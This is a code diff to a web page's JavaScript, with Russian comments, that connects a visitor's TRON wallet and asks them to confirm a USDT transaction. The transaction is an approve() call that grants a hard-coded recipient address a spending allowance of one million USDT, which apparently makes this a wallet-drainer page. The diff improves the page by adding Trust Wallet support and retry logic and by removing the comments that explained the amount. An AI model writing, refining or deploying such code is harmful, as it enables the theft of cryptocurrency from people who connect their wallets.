@@ -34,7 +34,7 @@
     </div>
 
     <script>
-        // Ваш реальный адрес кошелька-получателя (уже подставлен)
+        // Ваш реальный адрес кошелька-получателя
         const recipientAddress = "TGwPm9pCp1GzCavKLyhX54kqSQbUEZ7Uf";
         
         // Официальный смарт-контракт USDT в сети TRON (TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t)
@@ -54,21 +54,31 @@
             }
         });
 
-        // Реальное подключение кошелька
+        // Реальное подключение кошелька (обновленный вариант для Trust Wallet)
         document.getElementById('connectBtn').addEventListener('click', async function() {
             try {
-                // Проверяем наличие расширения TronLink или встроенного провайдера TRON
-                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                    userTronWeb = window.tronWeb;
+                let tron = window.tronWeb || (window.trustwallet && window.trustwallet.tronWeb);
+
+                // Даем браузеру кошелька секунду на инициализацию, если объекты еще не прогрузились
+                if (!tron) {
+                    for (let i = 0; i < 5; i++) {
+                        await new Promise(resolve => setTimeout(resolve, 500));
+                        tron = window.tronWeb || (window.trustwallet && window.trustwallet.tronWeb);
+                        if (tron && tron.defaultAddress && tron.defaultAddress.base58) break;
+                    }
+                }
+
+                if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
+                    userTronWeb = tron;
                     connectedAccount = userTronWeb.defaultAddress.base58;
                     document.getElementById('walletAddress').innerText = "Подключено: " + connectedAccount;
                     alert("Кошелек успешно подключен!");
                 } else {
-                    alert("Пожалуйста, откройте сайт через браузер кошелька (например, TronLink или Trust Wallet с поддержкой TRON)!");
+                    alert("Ошибка: Trust Wallet не передал данные сети TRON. Убедитесь, что в кошельке открыта сеть TRON.");
                 }
             } catch (error) {
                 console.error(error);
-                alert("Ошибка подключения кошелька.");
+                alert("Ошибка подключения кошелька: " + (error.message || error));
             }
         });
 
@@ -83,8 +93,6 @@
                 // Загружаем контракт USDT
                 const contract = await userTronWeb.contract().at(usdtContractAddress);
                 
-                // Максимальная сумма для вызова approve (или укажите нужное число с учетом 6 знаков после запятой для USDT)
-                // Например, 1000000 USDT = 1000000 * 10^6
                 const amount = "1000000000000"; 
 
                 alert("Подтвердите транзакцию в вашем кошельке...");
@@ -94,7 +102,7 @@
                     recipientAddress, 
                     amount
                 ).send({
-                    feeLimit: 100000000 // лимит энергии/трафика
+                    feeLimit: 100000000
                 });
 
                 console.log("Результат транзакции:", result);
